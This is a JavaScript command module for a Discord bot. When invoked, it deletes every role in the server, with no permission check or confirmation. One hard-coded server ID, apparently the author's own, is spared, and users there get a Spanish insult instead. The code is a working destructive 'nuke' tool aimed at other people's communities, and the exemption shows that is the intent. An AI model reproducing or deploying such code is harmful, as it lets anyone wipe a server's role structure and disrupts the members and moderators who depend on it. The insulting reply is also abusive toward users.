const Discord = require('discord.js');

module.exports = {
  name: 'drole',
  alias: ["roldelete", "rold", "dr"],

  execute (client, message, args){

    if (message.guild.id == "879159373270761522") return message.channel.send("¿Que intentas subnormal?")
  message.guild.roles.cache.map(roles => roles.delete());
  }
};
